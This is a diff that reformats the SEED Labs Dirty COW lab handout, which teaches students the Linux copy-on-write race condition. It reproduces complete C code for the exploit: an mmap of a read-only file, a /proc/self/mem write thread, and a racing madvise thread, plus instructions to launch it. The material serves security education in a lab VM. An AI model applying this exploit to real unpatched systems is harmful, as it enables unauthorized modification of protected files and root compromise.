@@ -2,43 +2,29 @@
 
 ```
 Copyright © 2017 by Wenliang Du.
-This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
-License. If you remix, transform, or build upon the material, this copyright notice must be left intact, or
-reproduced in a way that is reasonable to the medium in which the work is being re-published.
+This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License. If you remix, transform, or build upon the material, this copyright notice must be left intact, or reproduced in a way that is reasonable to the medium in which the work is being re-published.
 ```
 ## 1 Overview
 
-The Dirty COW vulnerability is an interesting case of the race condition vulnerability. It existed in the
-Linux kernel since September 2007, and was discovered and exploited in October 2016. The vulnerability
-affects all Linux-based operating systems, including Android, and its consequence is very severe: attackers
-can gain the root privilege by exploiting the vulnerability. The vulnerability resides in the code of copy-on-
-write inside Linux kernel. By exploiting this vulnerability, attackers can modify any protected file, even
-though these files are only readable to them.
-The objective of this lab is for students to gain the hands-on experience on the Dirty COW attack,
-understand the race condition vulnerability exploited by the attack, and gain a deeper understanding of the
-general race condition security problems. In this lab, students will exploit the Dirty COW race condition
-vulnerability to gain the root privilege.
+The Dirty COW vulnerability is an interesting case of the race condition vulnerability. It existed in the `Linux` kernel since September 2007, and was discovered and exploited in October 2016. The vulnerability affects all `Linux`-based operating systems, including Android, and its consequence is very severe: attackers can gain the root privilege by exploiting the vulnerability. The vulnerability resides in the code of copy-on-write inside `Linux` kernel. By exploiting this vulnerability, attackers can modify any protected file, even though these files are only readable to them.
+<Br>
+&emsp; The objective of this lab is for students to gain the hands-on experience on the Dirty COW attack, understand the race condition vulnerability exploited by the attack, and gain a deeper understanding of the general race condition security problems. In this lab, students will exploit the Dirty COW race condition vulnerability to gain the root privilege.
 
-Readings and videos. Detailed coverage of the Dirty COW attack can be found in the following:
+**Readings and videos.** Detailed coverage of the Dirty COW attack can be found in the following:
 
 - Chapter 8 of the SEED Book,Computer & Internet Security: A Hands-on Approach, 2nd Edition, by
     Wenliang Du. See details at https://www.handsonsecurity.net.
 - Section 7 of the SEED Lecture at Udemy,Computer Security: A Hands-on Approach, by Wenliang
     Du. See details at https://www.handsonsecurity.net/video.html.
 
-Lab environment. This lab has been tested on our pre-built Ubuntu 12.04 VM, which can be downloaded
-from the SEED website. If you are using our SEEDUbuntu 16.04 VM, this attack will not work, because
-the vulnerability has already been patched in the kernel. You can download the SEEDUbuntu12.04 VM
-from the SEED web site. If you have an Amazon EC2 account, you can find our VM from the “Community
-AMIs”. The name of the VM is `SEEDUbuntu12.04-Generic`. It should be noted that Amazon’s site
-says that this is a 64-bit VM; that is incorrect. The VM is 32-bit. However, this incorrect information does
+**Lab environment.** This lab has been tested on our pre-built Ubuntu 12.04 VM, which can be downloaded from the SEED website. If you are using our SEEDUbuntu 16.04 VM, this attack will not work, because the vulnerability has already been patched in the kernel. You can download the SEEDUbuntu12.04 VM from the SEED web site. If you have an Amazon EC2 account, you can find our VM from the “Community AMIs”. The name of the VM is `SEEDUbuntu12.04-Generic`. It should be noted that Amazon’s site says that this is a 64-bit VM; that is incorrect. The VM is 32-bit. However, this incorrect information does
 not cause any problem.
 
 Files needed for this lab are included in Labsetup.zip, which can be fetched by running the following commands.
 
 ```
-sudo wget https://seedsecuritylabs.org/Labs_20.04/Files/Dirty_COW/Labsetup.zip
-sudo unzip Labsetup.zip
+$ sudo wget https://seedsecuritylabs.org/Labs_20.04/Files/Dirty_COW/Labsetup.zip
+$ sudo unzip Labsetup.zip
 ```
 
 ## 2 Task 1: Modify a Dummy Read-Only File
@@ -47,9 +33,7 @@ The objective of this task is to write to a read-only file using the Dirty COW v
 
 ### 2.1 Create a Dummy File
 
-We first need to select a target file. Although this file can be any read-only file in the system, we will use
-a dummy file in this task, so we do not corrupt an important system file in case we make a mistake. Please
-create a file called `zzz` in the root directory, change its permission to read-only for normal users, and put
+We first need to select a target file. Although this file can be any read-only file in the system, we will use a dummy file in this task, so we do not corrupt an important system file in case we make a mistake. Please create a file called `zzz` in the root directory, change its permission to read-only for normal users, and put
 some random content into the file using an editor such as `gedit`.
 
 ```
@@ -64,18 +48,13 @@ $ echo 99999 > /zzz
 bash: /zzz: Permission denied
 ```
 
-From the above experiment, we can see that if we try to write to this file as a normal user, we will fail,
-because the file is only readable to normal users. However, because of the Dirty COW vulnerability in the
-system, we can find a way to write to this file. Our objective is to replace the pattern `"222222"` with `"******"`.
+&emsp; From the above experiment, we can see that if we try to write to this file as a normal user, we will fail, because the file is only readable to normal users. However, because of the Dirty COW vulnerability in the system, we can find a way to write to this file. Our objective is to replace the pattern `"222222"` with `"******"`.
 
 ### 2.2 Set Up the Memory Mapping Thread
 
-You can download the program `cowattack.c` from the website of the lab. The program has three threads:
-the main thread, the write thread, and the madvise thread. The main thread maps `/zzz` to memory, finds
-where the pattern `"222222"` is, and then creates two threads to exploit the Dirty COW race condition
-vulnerability in the OS kernel.
+You can download the program `cowattack.c` from the website of the lab. The program has three threads: the main thread, the write thread, and the madvise thread. The main thread maps `/zzz` to memory, finds where the pattern `"222222"` is, and then creates two threads to exploit the Dirty COW race condition vulnerability in the OS kernel.
 
-Listing 1: The main thread
+<p align="center">Listing 1: The main thread</p>
 
 ```
 /* cow_attack.c (the main thread) */
@@ -90,88 +69,80 @@ void *map;
 
 int main(int argc, char *argv[])
 {
-pthread_t pth1,pth2;
-struct stat st;
-int file_size;
-
-// Open the target file in the read-only mode.
-int f=open("/zzz", O_RDONLY);
-
-// Map the file to COW memory using MAP_PRIVATE.
-fstat(f, &st);
-file_size = st.st_size;
-map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
-
-// Find the position of the target area
-char *position = strstr(map, "222222");    1
-
-// We have to do the attack using two threads.
-pthread_create(&pth1, NULL, madviseThread, (void *)file_size);   2
-
-pthread_create(&pth2, NULL, writeThread, position);   3
-
-// Wait for the threads to finish.
-pthread_join(pth1, NULL);
-pthread_join(pth2, NULL);
-return 0;
+    pthread_t pth1,pth2;
+    struct stat st;
+    int file_size;
+    
+    // Open the target file in the read-only mode.
+    int f=open("/zzz", O_RDONLY);
+    
+    // Map the file to COW memory using MAP_PRIVATE.
+    fstat(f, &st);
+    file_size = st.st_size;
+    map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+    
+    // Find the position of the target area
+    char *position = strstr(map, "222222");                           ➀
+    
+    // We have to do the attack using two threads.
+    pthread_create(&pth1, NULL, madviseThread, (void *)file_size);    ➁
+    
+    pthread_create(&pth2, NULL, writeThread, position);               ➂
+    
+    // Wait for the threads to finish.
+    pthread_join(pth1, NULL);
+    pthread_join(pth2, NULL);
+    return 0;
 }
 ```
 
-In the above code, we need to find where the pattern `"222222"` is. We use a string function called `strstr()` to find where `"222222"` is in the mapped memory (Line 1). We then start two threads: `madviseThread`(Line2) and `writeThread`(Line 3).
+&emsp; In the above code, we need to find where the pattern `"222222"` is. We use a string function called `strstr()` to find where `"222222"` is in the mapped memory (Line ➀). We then start two threads: `madviseThread` (Line ➁) and `writeThread` (Line ➂).
 
 ### 2.3 Set Up the write Thread
 
-The job of the `write` thread listed in the following is to replace the string `"222222"` in the memory with `"******"`. Since the mapped memory is of COW type, this thread alone will only be able to modify the
-contents in a copy of the mapped memory, which will not cause any change to the underlying `/zzz` file.
+The job of the `write` thread listed in the following is to replace the string `"222222"` in the memory with `"******"`. Since the mapped memory is of COW type, this thread alone will only be able to modify the contents in a copy of the mapped memory, which will not cause any change to the underlying `/zzz` file.
 
-Listing 2: Thewritethread
+<p align="center">Listing 2: Thewritethread</p>
 
 ```
 /* cow_attack.c (the write thread) */
 
 void *writeThread(void*arg)
 {
-char *content= "******";
-off_t offset = (off_t) arg;
-
-int f=open("/proc/self/mem", O_RDWR);
-while(1) {
-// Move the file pointer to the corresponding position.
-lseek(f, offset, SEEK_SET);
-// Write to the memory.
-write(f, content, strlen(content));
-}
+    char *content= "******";
+    off_t offset = (off_t) arg;
+    
+    int f=open("/proc/self/mem", O_RDWR);
+    while(1) {
+    // Move the file pointer to the corresponding position.
+    lseek(f, offset, SEEK_SET);
+    // Write to the memory.
+    write(f, content, strlen(content));
+    }
 }
 ```
 
 ### 2.4 The madvise Thread
 
-The `madvise` thread does only one thing: discarding the private copy of the mapped memory, so the page
-table can point back to the original mapped memory.
+The `madvise` thread does only one thing: discarding the private copy of the mapped memory, so the page table can point back to the original mapped memory.
 
-Listing 3: The `madvise` thread
+<p align="center"> Listing 3: The 'madvise' thread</p>
 
 ```
 /* cow_attack.c (the madvise thread) */
 
 void *madviseThread(void*arg)
 {
-int file_size = (int) arg;
-while(1){
-madvise(map, file_size, MADV_DONTNEED);
-}
+    int file_size = (int) arg;
+    while(1){
+    madvise(map, file_size, MADV_DONTNEED);
+    }
 }
 ```
 
 ### 2.5 Launch the Attack
 
-If the `write()` and the `madvise()` system calls are invoked alternatively, i.e., one is invoked only after
-the other is finished, the `write` operation will always be performed on the private copy, and we will never
-be able to modify the target file. The only way for the attack to succeed is to perform the `madvise()` system call while the `write()` system call is still running. We cannot always achieve that, so we need
-to try many times. As long as the probability is not extremely low, we have a chance. That is why in the
-threads, we run the two system calls in an infinite loop. Compile the `cowattack.c` and run it for a few
-seconds. If your attack is successful, you should be able to see a modified `/zzz` file. Report your results in
-the lab report and explain how you are able to achieve that.
+If the `write()` and the `madvise()` system calls are invoked alternatively, i.e., one is invoked only after the other is finished, the `write` operation will always be performed on the private copy, and we will never be able to modify the target file. The only way for the attack to succeed is to perform the `madvise()` system call while the `write()` system call is still running. We cannot always achieve that, so we need to try many times. As long as the probability is not extremely low, we have a chance. That is why in the threads, we run the two system calls in an infinite loop. Compile the `cowattack.c` and run it for a few seconds. If your attack is successful, you should be able to see a modified `/zzz` file. Report your results in the lab report and explain how you are able to achieve that.
 
 ```
 $ gcc cow_attack.c -lpthread
